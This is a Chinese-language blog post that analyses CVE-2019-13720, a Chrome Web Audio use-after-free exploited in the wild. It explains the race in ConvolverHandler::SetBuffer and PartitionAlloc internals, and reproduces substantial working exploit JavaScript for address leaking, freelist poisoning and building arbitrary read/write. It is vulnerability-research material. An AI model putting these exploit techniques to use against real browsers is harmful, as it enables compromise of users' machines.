<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>分析 CVE-2019-13720 | PwnTips</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="分析 CVE-2019-13720" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="CVE-2019-13720" />
<meta property="og:description" content="CVE-2019-13720" />
<link rel="canonical" href="https://pwntips.github.io/2022/05/26/CVE-2019-13720.html" />
<meta property="og:url" content="https://pwntips.github.io/2022/05/26/CVE-2019-13720.html" />
<meta property="og:site_name" content="PwnTips" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-05-26T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="分析 CVE-2019-13720" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-26T00:00:00+08:00","datePublished":"2022-05-26T00:00:00+08:00","description":"CVE-2019-13720","headline":"分析 CVE-2019-13720","mainEntityOfPage":{"@type":"WebPage","@id":"https://pwntips.github.io/2022/05/26/CVE-2019-13720.html"},"url":"https://pwntips.github.io/2022/05/26/CVE-2019-13720.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://pwntips.github.io/feed.xml" title="PwnTips" /><script async src="https://www.googletagmanager.com/gtag/js?id=G-LDS6Z1TT65"></script>
<script>
  window['ga-disable-G-LDS6Z1TT65'] = window.doNotTrack === "1" || navigator.doNotTrack === "1" || navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1";
  window.dataLayer = window.dataLayer || [];
  function gtag(){window.dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-LDS6Z1TT65');
</script>

</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">PwnTips</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">分析 CVE-2019-13720</h1>
    <p class="post-meta"><time class="dt-published" datetime="2022-05-26T00:00:00+08:00" itemprop="datePublished">
        May 26, 2022
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <h1 id="cve-2019-13720">CVE-2019-13720</h1>

<p>分析<a href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/">卡巴斯基</a> 2019 年披露的在野利用 <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-13720.html">CVE-2019-13720</a>。</p>

<h2 id="漏洞分析">漏洞分析</h2>

<h3 id="复现">复现</h3>

<p><a href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/">分析报告</a> 记录了受影响的 Chrome 版本号 76.0.3809.87，依照<a href="/2022/05/31/get-old-version-chrome-binary.html">获取旧版本的 Chrome</a> 中记录的方法，构建出 Chrome.exe。</p>

<hr />

<p><strong>ℹ️NOTE</strong>：编译使用的 Clang 与最新的 MSVC 运行时不兼容，编译此版本需要安装 Visual Studio 2017</p>

<hr />

<p>从分析报告提取出 POC 代码片段，拼凑成一个完整的 POC 页面，代码中缺少 <code class="language-plaintext highlighter-rouge">getPartitionPageFreeListHeadEntryBySlotSize</code> 函数，先补充一个空函数，稍后理解了 POC 后再把它补上了。</p>

<p>python -m http.server 为 POC 页面搭建一个本地站点，Chrome.exe 访问 http://localhost:8000/ 确认可以触发漏洞。</p>

<h3 id="web-audio-api">Web Audio API</h3>

<hr />

<p><strong>ℹ️NOTE</strong></p>

<p>POC 用到了很多 Web Audio API 相关的对象，推荐先看下 MDN 相关页面：</p>

<ul>
  <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API/Using_Web_Audio_API">MDN Using Web Audio API</a></li>
  <li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Audio_API">MDN Web Audio API</a></li>
</ul>

<hr />

<p>Web Audio API 提供了流式处理音频数据的能力，支持音频解码，音效处理等常用操作。</p>

<p>用法：先创建 AudioContext 对象，再创建多个音频节点，将它们连到一起组成音频处理图。AudioContext 对象有一个特殊的 desination 节点，代表最终输出的音频。处理图从源节点开始，到目的节点结束，中间可以连接多个音效节点。启动处理任务，音频数据就沿着图到达各个中间节点，经过中间节点的处理，再继续流转到下个节点。</p>

<hr />

<p><strong>ℹ️NOTE</strong>: 就类似于把电吉他、效果器、音箱等用线连好，之后在电吉他上进行操作，电吉他采集到的声音数据就顺着导线，经过效果器的处理，最终达到音箱播放出来。</p>

<hr />

<p>示例代码：</p>

<pre><code class="language-JavaScript">const audioCtx = new AudioContext();

// load some sound
const audioElement = document.querySelector('audio');
const track = audioCtx.createMediaElementSource(audioElement);

// volume
const gainNode = audioCtx.createGain();

// panning
const pannerOptions = {pan: 0};
const panner = new StereoPannerNode(audioCtx, pannerOptions);

// connect our graph
track.connect(gainNode).connect(panner).connect(audioCtx.destination);

// audioElement.play();
</code></pre>

<p>处理好的声音也可以不播放出来，而是缓存起来。<code class="language-plaintext highlighter-rouge">OfflineAudioContext</code> 就实现了这样的处理流程，它会启动一个后台处理任务，在后台工作线程中处理音频，处理结果保存到缓存中，待处理完成后供主线程使用。</p>

<h3 id="成因">成因</h3>

<p>漏洞是在 <a href="https://developer.mozilla.org/en-US/docs/Web/API/ConvolverNode">ConvolerNode</a> 节点的处理逻辑中，这个节点属于音效处理节点，用来对音频进行混响（Convolution Reverb），混响是音频信号处理中的一种算法，用来把声音进行叠加处理，模拟真实环境中的声音传播时的反射和叠加，漏洞和其算法细节关系不大，可以把它当做一种黑盒算法，输入就是原始的音频数据和 Impulse Response (IR）两个向量(多维数组)，输出就是混淆处理后的数据。IR 参数也是音频数据，JavaScript 中通过给 ConvolerNode.buffer 赋值来设置 IR 的值，对应的是 CPP 函数 <code class="language-plaintext highlighter-rouge">ConvolverHandler::SetBuffer</code>。漏洞就在这个函数里，给 <code class="language-plaintext highlighter-rouge">SetBuffer</code> 传一个空值时，它会释放 <code class="language-plaintext highlighter-rouge">revert_</code> 和 <code class="language-plaintext highlighter-rouge">shared_buffer_</code> 两个成员变量，但是这个操作没有加锁同步，如果其他线程正在使用这两个成员，就可能访问到释放后的内存。</p>

<hr />

<p><strong>ℹ️NOTE</strong>: 音频数据大多是多声道的，所以一般是用一个向量来表示的，向量的维度和声道一致，例如：单声道用一维向量，立体声用二维向量。漏洞利用过程中用到的都是单声道的一维向量。</p>

<hr />

<pre><code class="language-CPP">void ConvolverHandler::SetBuffer(AudioBuffer* buffer,
                                 ExceptionState&amp; exception_state) {
  DCHECK(IsMainThread());

  if (!buffer) {
    reverb_.reset();
    shared_buffer_ = nullptr;
    return;
  }
...
}
</code></pre>

<p>用 <code class="language-plaintext highlighter-rouge">OfflineAudioContext</code> 就可以构造出符合条件的场景，<code class="language-plaintext highlighter-rouge">OfflineAudioContext</code> 启动的音频处理任务是在后台工作线程中进行的，如果工作线程正要进行混响处理时，主线程中把 <code class="language-plaintext highlighter-rouge">buffer</code> 设置为 <code class="language-plaintext highlighter-rouge">null</code>，那么工作线程后续处理就可能读/写到已经释放的内存。</p>

<hr />

<p><strong>ℹ️NOTE</strong>: JavaScript 解释器是在 renderer 进程的主线程中运行的，执行音频处理这种耗时操作可能会阻塞其他代码的运行，影响用户界面响应。为了解决这个问题，耗时操作在 JavaScript 中一般都是在其他工作线程中异步处理的</p>

<hr />

<p>调试混响处理的流程，在下面这个函数中找到两个利用点：</p>

<pre><code class="language-CPP">void ReverbConvolver::Process(const AudioChannel* source_channel,
                              AudioChannel* destination_channel,
                              uint32_t frames_to_process) {
  DCHECK(source_channel);
  DCHECK(destination_channel);
  DCHECK_GE(source_channel-&gt;length(), frames_to_process);
  DCHECK_GE(destination_channel-&gt;length(), frames_to_process);

  const float* source = source_channel-&gt;Data();
  float* destination = destination_channel-&gt;MutableData();
  DCHECK(source);
  DCHECK(destination);

  // Feed input buffer (read by all threads)
  input_buffer_.Write(source, frames_to_process); // &lt;&lt;&lt;

  // Accumulate contributions from each stage
  for (wtf_size_t i = 0; i &lt; stages_.size(); ++i)
    stages_[i]-&gt;Process(source, frames_to_process);

  // Finally read from accumulation buffer
  accumulation_buffer_.ReadAndClear(destination, frames_to_process); // &lt;&lt;&lt;

  // Now that we've buffered more input, post another task to the background
  // thread.
  if (background_thread_) {
    PostCrossThreadTask(
        *background_thread_-&gt;GetTaskRunner(), FROM_HERE,
        CrossThreadBindOnce(&amp;ReverbConvolver::ProcessInBackground,
                            CrossThreadUnretained(this)));
  }
}
</code></pre>

<p><code class="language-plaintext highlighter-rouge">ReverbConvolver</code> 是 <code class="language-plaintext highlighter-rouge">reverb_</code> 的成员，<code class="language-plaintext highlighter-rouge">input_buffer_</code> 和 <code class="language-plaintext highlighter-rouge">accumulation_buffer_</code>  这两个数组又是 ReverbConvolver 的成员，所以 reverb_ 析构时，<code class="language-plaintext highlighter-rouge">input_buffer_</code> 和 <code class="language-plaintext highlighter-rouge">accumulation_buffer_</code> 会被释放。如果释放后立刻执行到写入，<code class="language-plaintext highlighter-rouge">input_buffer_.Write</code> 就可以把数据写入释放后的内存。类似的 <code class="language-plaintext highlighter-rouge">accumulation_buffer_.ReadAndClear</code> 可以读到释放后的内存。</p>

<h3 id="利用">利用</h3>

<h4 id="partitionalloc">PartitionAlloc</h4>

<p>理解利用要先了解 PartitionAlloc 的元数据，下面的信息针对 76.0.3809.87 这个版本:</p>
<ul>
  <li>PartitionAlloc 将堆分成多个 Partition，每种类型都固定从一个 Partition 申请内存，这样就可以把不同类型的对象在内存上隔离开，增加漏洞利用的难度。例如 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 这种漏洞利用中常用的结构，被隔离到专用的 Partition 中，即使 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 出现了越界读写问题，仅借助越界读写是不能跨越界限读到其他 Partition 的内容的。</li>
  <li>PartitionAlloc 以 SuperPage (2 MiB) 为粒度从系统申请（预留）内存</li>
  <li>每个 SuperPage 被分割成多个 PartitionPage (16 KiB)，首尾两个 PartitionPage 除第一个 PartitionPage 中第二个物理页面会被提交，其他部分都预留为不可访问的 guard page</li>
  <li>第一个 PartitionPage 中的特殊页面，用来存放元数据，元数据可以先简单看成总计 4 KiB 的 <a href="https://source.chromium.org/chromium/chromium/src/+/main:base/allocator/partition_allocator/partition_page.h;l=314;drc=e5b03e85ea180d1d1ab0dec471c7fd5d1706a9e4"><code class="language-plaintext highlighter-rouge">base::internal::PartitionPage</code></a> 数组，数组中每一项都对应着一个 PartitionPage，结构中存储了此 PartitionPage 的空闲块链表头，后继页地址，当前页状态等信息。
例如：元数据数组下标 1 处，存放的就是第二个 PartitionPage 的元数据
注意这里有两个 PartionPage，一个代表页面的单位，另一个是代表存储元数据的结构体。</li>
  <li>PartitionPage 被分割成大小相同的内存块 (slot)，元数据中的空闲链表里存放着本页面内所有空闲内存块，此链表是一个单链表，采用的是头插法</li>
  <li>每个 Partition 都有一组桶，每个桶都对应一个特定的大小，桶内存储一个 PartitionPage 元数据的地址，此页面的内存块大小和桶的大小匹配。这样在申请内存时，可以根据目的大小快速找到对应的桶，从桶指向的页面的空闲列表中分配一个满足条件的内存块。</li>
  <li>内存块释放时，PartitionAlloc 用内存块地址计算出其所在页面的元数据的地址，将其插入空闲链表中。计算方法：通过与位运算算出 SuperPage 的地址，位运算算出内存块所在 PartitionPage 相对 SuperPage 的索引 i，最后通过 SuperPage + 4 KiB + i * sizeof(PartitionPage) 计算出元数据的地址。</li>
</ul>

<p>更多内容参考：</p>
<ul>
  <li><a href="https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md">官方文档</a></li>
  <li><a href="https://source.chromium.org/chromium/chromium/src/+/main:base/allocator/partition_allocator/partition_alloc_constants.h">代码注释</a></li>
</ul>

<h4 id="创建-iirfilters">创建 IIRFilters</h4>

<p>申请一组 <code class="language-plaintext highlighter-rouge">IIRFilter</code> 供后续利用使用，其他信息后面用到时再说明。</p>

<pre><code class="language-JavaScript">function initialSetup() {
	let audioCtx = new OfflineAudioContext(1, 20, 3000);

	let feedForward = new Float64Array(2);
	let feedback = new Float64Array(1);

	feedback[0] = 1;
	feedForward[0] = 0;
	feedForward[1] = -1;

	for (let i = 0; i &lt; 512; i++)
		iirFilters.push(audioCtx.createIIRFilter(feedForward, feedback));
}
</code></pre>

<h4 id="泄露地址">泄露地址</h4>

<p><code class="language-plaintext highlighter-rouge">accumulation_buffer_</code> 和 <code class="language-plaintext highlighter-rouge">input_buffer_</code> 内部都有一个名为 <code class="language-plaintext highlighter-rouge">buffer_</code> 的 <a href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/platform/audio/audio_array.h"><code class="language-plaintext highlighter-rouge">AudioArray</code></a> 成员变量，负责管理内部缓冲区。<code class="language-plaintext highlighter-rouge">AudioArray</code> 直接从 PartitionAlloc 申请所需的内存。</p>

<p><code class="language-plaintext highlighter-rouge">AudioArray</code> 的析构函数会释放之前申请的内存块，由 PartitionAlloc 把它插入所属页面的空闲链表，把下一个空闲块指针写入内存块开头的 8 字节。因此，在 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 把缓冲区释放后再读取其内容，就可以读到后继空闲块的地址。漏洞利用的第一部分就是利用 accumulation_buffer_ 读取到这个地址。</p>

<hr />

<p><strong>ℹ️NOTE</strong>: 从 ParitionAlloc 申请的内存地址，存放在 <code class="language-plaintext highlighter-rouge">AudioArray::allocation_</code></p>

<hr />

<p>代码：</p>

<pre><code class="language-JavaScript">async function triggerUaF(doneCb) {
	let audioCtx = new OfflineAudioContext(2, 0x400000, 48000);
	let bufferSource = audioCtx.createBufferSource();
	let convolver = audioCtx.createConvolver();
	let scriptNode = audioCtx.createScriptProcessor(0x4000, 1, 1);
	let channelBuffer = audioCtx.createBuffer(1, 1, 48000);

	convolver.buffer = channelBuffer;
	bufferSource.buffer = channelBuffer;

	bufferSource.loop = true;
	bufferSource.loopStart = 0;
	bufferSource.loopEnd = 1;

	channelBuffer.getChannelData(0).fill(0);

	bufferSource.connect(convolver);
	convolver.connect(scriptNode);
	scriptNode.connect(audioCtx.destination);

	bufferSource.start();

	let finished = false;

	scriptNode.onaudioprocess = function(evt) {
    		let channelDataArray =
	    		new Uint32Array(evt.inputBuffer.getChannelData(0).buffer);

    		for (let j = 0; j &lt; channelDataArray.length; j++) {
        		if (j + 1 &lt; channelDataArray.length &amp;&amp;
	        		channelDataArray[j] != 0 &amp;&amp; channelDataArray[j + 1] != 0) {
            			let u64Array = new BigUint64Array(1);
            			let u32Array = new Uint32Array(u64Array.buffer);
            			u32Array[0] = channelDataArray[j + 0];
            			u32Array[1] = channelDataArray[j + 1];

            			let leakedAddr = byteSwapBigInt(u64Array[0]);
            			if (leakedAddr &gt;&gt; BigInt(32) &gt; BigInt(0x8000))
                			leakedAddr -= BigInt(0x800000000000);

             			let superPageBase = getSuperPageBase(leakedAddr);

	             		if (superPageBase &gt; BigInt(0xFFFFFFFF) &amp;&amp;
		             		superPageBase &lt; BigInt(0xFFFFFFFFFFFF)) {
                			finished = true;
                			evt = null;

                			bufferSource.disconnect();
                			scriptNode.disconnect();
                			convolver.disconnect();

                			setTimeout(function() {
                     			doneCb(leakedAddr);
                			}, 1);

                			return;
            			}
        		}
    		}
	};

	audioCtx.startRendering().then(function(buffer) {
    		buffer = null;

    		if (!finished) {
        	 	finished = true;
       	  	triggerUaF(doneCb);
    		}
	});

	while (!finished) {
    		convolver.buffer = null;
    		convolver.buffer = channelBuffer;
    		await later(100); // wait 100 millseconds
	}
}

function later(delay) {
	return new Promise(resolve =&gt; setTimeout(resolve, delay));
}

function byteSwapBigInt(x) {
  let result = BigInt(0);
  let tmp = x;

  for (let i = 0; i &lt; 8; i++) {
    result = result &lt;&lt; BigInt(8);
    result += tmp &amp; BigInt(0xFF);
    tmp = tmp &gt;&gt; BigInt(8);
  }

  return result;
}
</code></pre>

<p>思路如下：</p>
<ul>
  <li>创建一段全 0 的音频数据 channelBuffer</li>
  <li>创建节点：
    <ul>
      <li>音源节点 bufferSource，以 channelBuffer 为输入</li>
      <li>混响处理节点 convolerNode，IR 参数为 channelBuffer</li>
      <li>脚本处理节点 scriptNode，利用其 onaudioprocess 事件处理函数，检查混响输出的数据</li>
    </ul>
  </li>
  <li>连接上面的所有节点，构造 bufferSouce -&gt; convolerNode -&gt; scriptNode -&gt; destination 处理图，其中 destination 是 <code class="language-plaintext highlighter-rouge">OfflineAudioContext</code> 内部的特殊节点，代表数据处理的结果</li>
  <li>调用 <code class="language-plaintext highlighter-rouge">startRendering()</code> 函数，启动音频处理任务，这个函数返回的是 <code class="language-plaintext highlighter-rouge">Promise</code> 对象，调用其 <code class="language-plaintext highlighter-rouge">then</code> 设置一个回调函数，在任务完成后检查漏洞是否利用成功，如果没成功则递归调用 trigerUaF 继续触发漏洞</li>
  <li><code class="language-plaintext highlighter-rouge">startRendering</code> 只是发送一个任务到音频处理线程，不会等待任务的处理，在其返回后主线程继续执行后续代码，执行到 while 循环，不断的在 <code class="language-plaintext highlighter-rouge">null</code> 和 <code class="language-plaintext highlighter-rouge">channelBuffer</code> 之间赋值混淆节点的 <code class="language-plaintext highlighter-rouge">buffer</code>。</li>
</ul>

<p>对全 0 数据做混响，得到的结果应该还是全 0，如果混响的结果中包含了非 0 数据，就说明漏洞被成功触发了，混响过程中读到了下一个空闲块的指针。scriptNode 的事件处理就是在检查混响输出的数据，在其中查找这个指针，这个指针是大小端翻转过的，在读取到以后要用 <code class="language-plaintext highlighter-rouge">byteSwapBigInt</code> 把它复原。</p>

<hr />

<p><strong>ℹ️NOTE</strong>: PartitionAlloc 为了缓解漏洞利用，把空闲链表的指针大小端翻转存储。</p>

<hr />

<h4 id="计算-iirfilterfeedforward_-地址">计算 IIRFilter.feedforward_ 地址</h4>

<p><a href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/platform/audio/iir_filter.h"><code class="language-plaintext highlighter-rouge">IIRFilter</code></a> 内部也有一个 <code class="language-plaintext highlighter-rouge">AudioArray</code> 成员 <code class="language-plaintext highlighter-rouge">IIRFilter::feedforward_</code>。用上一步泄露出的地址，加上固定的偏移，就可以计算出 <code class="language-plaintext highlighter-rouge">IIRFilter.feedforward_</code> 的地址。</p>

<hr />

<p><strong>ℹ️NOTE</strong>: 水平所限我不能确定这个固定偏移的来源，我推测是每次 <code class="language-plaintext highlighter-rouge">JavaScript</code> 代码运行过程中分配的对象大致相同，整体占用内存也不多，就使得两块内存一般在同一个 SuperPage 中且间隔页面大致固定。</p>

<hr />

<pre><code class="language-JavaScript">function initialUAFCallback(addr) {
  let partitionPageIndexDelta = undefined;
  sharedAudioCtx = new OfflineAudioContext(1, 1, 3000);

  switch (majorVersion) {
    case 77: // 77.0.3865.75
      partitionPageIndexDelta = BigInt(-26);
      break;

    case 76: // 76.0.3809.87
      partitionPageIndexDelta = BigInt(-25);
      break;
  }

  iirFilterFeedforwardAllocationPtr =
	  getPartitionPageBaseWithinSuperPage(addr, getPartitionPageIndex(addr) +
		partitionPageIndexDelta) + BigInt(0x1FF0);

  triggerSecondUAF(
	  byteSwapBigInt(iirFilterFeedforwardAllocationPtr),
	  finalUAFCallback
	 );
}
</code></pre>

<h4 id="释放-iirfilterfeedforward_">释放 IIRFilter.feedforward_</h4>

<pre><code class="language-JavaScript">async function triggerSecondUAF(addr, doneCb) {
  let counter = 0;
  let numChannels = 1;
  let audioCtx = new OfflineAudioContext(1, 0x100000, 48000);
  let bufferSource = audioCtx.createBufferSource();
  let convolver = audioCtx.createConvolver();
  let bigAudioBuffer = audioCtx.createBuffer(numChannels, 0x100, 48000);
  let smallAudioBuffer = audioCtx.createBuffer(numChannels, 0x2, 48000);

  smallAudioBuffer.getChannelData(0).fill(0);

  for (let i = 0; i &lt; numChannels; i++) {
    let channelDataArray =
	    new BigUint64Array(bigAudioBuffer.getChannelData(i).buffer);
    channelDataArray[0] = addr;
  }

  bufferSource.buffer = bigAudioBuffer;
  convolver.buffer = smallAudioBuffer;

  bufferSource.loop = true;
  bufferSource.loopStart = 0;
  bufferSource.loopEnd = 1;

  bufferSource.connect(convolver);
  convolver.connect(audioCtx.destination);

  bufferSource.start();

  let finished = false;

  audioCtx.startRendering().then(function (buffer) {
    buffer = null;

    if (finished) {
      audioCtx = null;
      setTimeout(doneCb, 200);
      return;
    } else {
      finished = true;
      setTimeout(function () {
        triggerSecondUAF(addr, doneCb);
      }, 1);
    }
  });

  while (!finished) {
    counter++;
    convolver.buffer = null;

    await later(1); // wait 1 millisecond
    if (finished)
      break;

    for (let i = 0; i &lt; iirFilters.length; i++) {
      floatArray.fill(0);
      iirFilters[i].getFrequencyResponse(floatArray, floatArray, floatArray);

      if (floatArray[0] != 3.1415927410125732) {
        finished = true;
       // &lt;&lt; 申请被释放掉的 IIRFilter.feedforward_
        audioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));
        audioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));
        bufferSource.disconnect();
        convolver.disconnect();
        return;
      }
    }

    await later(1); // wait 1 millisecond
    convolver.buffer = smallAudioBuffer;
  }
}
</code></pre>

<p>用 <code class="language-plaintext highlighter-rouge">IIRFilter.Feewordward_</code> 的地址把 <code class="language-plaintext highlighter-rouge">AudioBuffer</code> 填满，之后再次触发漏洞，利用 <code class="language-plaintext highlighter-rouge">accumulation_buffer_</code>，把 <code class="language-plaintext highlighter-rouge">IIRFilter.feedforward_</code> 的地址写入释放后的内存块开头，就相当于把 <code class="language-plaintext highlighter-rouge">IIRFilter.feedforward_</code> 指向的缓冲区插入 <code class="language-plaintext highlighter-rouge">accumulation_buffer_</code> 所属页面的空闲链表。</p>

<p><code class="language-plaintext highlighter-rouge">IIRFilter.feedforward_</code> 和 <code class="language-plaintext highlighter-rouge">accumulation_buffer_</code> 两个内存块的大小不同，所属页面也一定不同，<code class="language-plaintext highlighter-rouge">IIRFilter.feedforward_</code> 其实是被插入到了错误的链表上，但是这并不影响漏洞利用，后续对 <code class="language-plaintext highlighter-rouge">AudioArray::Allocate</code> 函数调用会申请到这块内存，之后这块内存再次被释放时，释放动作就会把它插入到正确的页面中，就修正了之前的错误。</p>

<hr />

<p><strong>ℹ️NOTE</strong>: 我调试来看由于利用代码故意选择了 0xf0 结尾的内存地址，此内存块的地址不满足 <code class="language-plaintext highlighter-rouge">AudioBuffer</code> 的 0x20 对齐要求，<code class="language-plaintext highlighter-rouge">AudioBuffer</code> 在申请到以后并不会使用这块内存，直接就释放了。</p>

<hr />

<pre><code class="language-CPP">woid AudioArray::Allocate(size_t n) {
	// Although n is a size_t, its true limit is max unsigned because we use
	// unsigned in zeroRange() and copyToRange(). Also check for integer
	// overflow.
	CHECK_LE(n, std::numeric_limits&lt;unsigned&gt;::max() / sizeof(T));
	uint32_t initial_size = static_cast&lt;uint32_t&gt;(sizeof(T) * n);

#if defined(ARCH_CPU_X86_FAMILY) || defined(WTF_USE_WEBAUDIO_FFMPEG)
	const unsigned kAlignment = 32;
#else
	const unsigned kAlignment = 16;
#endif

	if (allocation_)
		WTF::Partitions::FastFree(allocation_);

	bool is_allocation_good = false;

	while (!is_allocation_good) {
		// Initially we try to allocate the exact size, but if it's not aligned
		// then we'll have to reallocate and from then on allocate extra.
		static unsigned extra_allocation_bytes = 0;

		unsigned total =
				base::CheckAdd(initial_size, extra_allocation_bytes).ValueOrDie();
		T* allocation = static_cast&lt;T*&gt;(WTF::Partitions::FastZeroedMalloc(
				total, WTF_HEAP_PROFILER_TYPE_NAME(AudioArray&lt;T&gt;)));
		CHECK(allocation);

		T* aligned_data = AlignedAddress(allocation, kAlignment);

		if (aligned_data == allocation || extra_allocation_bytes == kAlignment) {
			allocation_ = allocation;
			aligned_data_ = aligned_data;
			size_ = static_cast&lt;uint32_t&gt;(n);
			is_allocation_good = true;
		} else {
			// always allocate extra after the first alignment failure.
			extra_allocation_bytes = kAlignment;
			WTF::Partitions::FastFree(allocation);
		}
	}
}
</code></pre>

<p>通过 <code class="language-plaintext highlighter-rouge">IIRFilter.getFrequencyResponse</code> 函数读取 <code class="language-plaintext highlighter-rouge">IIRFilter::feedforwwrd_</code> 存储的数据，运算后写入输出缓冲区。正常情况下 <code class="language-plaintext highlighter-rouge">IIRFilter::feedforward_</code> 内容是 0， 运算结果是 π。漏洞利用成功后 <code class="language-plaintext highlighter-rouge">IIRFilter::feedforwrd_</code> 的内容被改写成了空闲链表的下一项指针，返回值也一定改变了，所以通过此函数可以判断漏洞是否利用成功。</p>

<p><code class="language-plaintext highlighter-rouge">IIRFilter:: feedforward_</code> 使用 0x30 字节的缓冲区， <code class="language-plaintext highlighter-rouge">ArrayBufferContents::DataHolder</code> 也占 0x30 字节，把 <code class="language-plaintext highlighter-rouge">IIRFilter::feedforward_</code> 插入空闲链表后，再申请 <code class="language-plaintext highlighter-rouge">ArrayBufferContents::DataHolder</code>，就可以把 <code class="language-plaintext highlighter-rouge">IIRFilter::feedforward_</code> 所在内存块再次申请出来，这样就得到指向同一个内存块的 <code class="language-plaintext highlighter-rouge">IIRFilter::feedforward_</code> 和 <code class="language-plaintext highlighter-rouge">ArrayBufferContent::DataHolder</code></p>

<hr />

<p><strong>ℹ️NOTE</strong>: <code class="language-plaintext highlighter-rouge">IIRFilter::feedforward_</code> 存储两个 double 仅需要 0x10 字节，但由于 <code class="language-plaintext highlighter-rouge">AudioArray</code> 的对齐要求，会多申请 0x20 字节，所以实际使用的 0x30 字节的内存块。</p>

<hr />

<ul>
  <li>ArrayBufferContents::DataHolder
    <ul>
      <li>0x00 ref_count_ 引用计数</li>
      <li>0x08 data_ 缓冲区，属于 ArrayBufferPartition</li>
      <li>0x10 data_length_ 缓冲区长度</li>
      <li>0x18 deleter_ 释放函数</li>
      <li>0x20 deleter_info_ 释放附加信息</li>
      <li>0x28 is_shared_</li>
      <li>0x2C has_registerd_external_allocation_</li>
    </ul>
  </li>
</ul>

<p><code class="language-plaintext highlighter-rouge">ArrayBufferContents::DataHolder</code> 被用在 <code class="language-plaintext highlighter-rouge">WTF::ArrayBuffer</code> 内部，管理从 PartitionAlloc 申请的内存块。而 <code class="language-plaintext highlighter-rouge">WTF::ArrayBuffer</code> 又被 <code class="language-plaintext highlighter-rouge">blink::AudioBuffer</code>、<code class="language-plaintext highlighter-rouge">blink::ImageData</code> 用做内部数据存储。这样一来，创建 <code class="language-plaintext highlighter-rouge">AudioBuffer</code>、<code class="language-plaintext highlighter-rouge">ImageData</code>，就相当于创建 <code class="language-plaintext highlighter-rouge">ArrayBufferContents::DataHolder</code>。代码 <code class="language-plaintext highlighter-rouge">audioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));
 就是在创建 </code>ArrayBufferContents::DataHolder<code class="language-plaintext highlighter-rouge"> 来占坑刚刚被释放的 </code>IIRFilter::feedforward_`。</p>

<h3 id="任意地址读写">任意地址读写</h3>

<pre><code class="language-JavaScript">async function finalUAFCallback() {
	for (let i = 0; i &lt; 256; i++) {
		floatArray.fill(0);

		iirFilters[i].getFrequencyResponse(floatArray, floatArray, floatArray);

		if (floatArray[0] != 3.1415927410125732) {
			await collectGargabe();

			audioBufferArray2 = [];

			for (let j = 0; j &lt; 80; j++)
				audioBufferArray1.push(sharedAudioCtx.createBuffer(1, 2, 10000));

			iirFilters = new Array(1);
			await collectGargabe();

			for (let j = 0; j &lt; 336; j++)
				imageDataArray.push(new ImageData(1, 2));

			imageDataArray = new Array(10);
			await collectGargabe();

			for (let j = 0; j &lt; audioBufferArray1.length; j++) {
				let auxArray = new
					BigUint64Array(audioBufferArray1[j].getChannelData(0).buffer);
				if (auxArray[0] != BigInt(0)) {
					kickPayload(auxArray);
					return;
				}
			}
			return;
		}
	}
}

function collectGargabe() {
	let promise = new Promise(function (cb) {
		let arg;
		for (let i = 0; i &lt; 400; i++)
			new ArrayBuffer(1024 * 1024 * 60).buffer;
		cb(arg);
	});
	return promise;
}
</code></pre>

<p><code class="language-plaintext highlighter-rouge">IIRFilter</code>、<code class="language-plaintext highlighter-rouge">ImageData</code>、<code class="language-plaintext highlighter-rouge">AudioBuffer</code> 这几个对象，及其内部的一些成员，是由 Oilpan GC 管理的，为了确保它们在特定的时刻被释放，需要主动触发 GC，<code class="language-plaintext highlighter-rouge">collectGarbage</code> 函数通过申请多个 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 占用大量内存来触发 GC。</p>

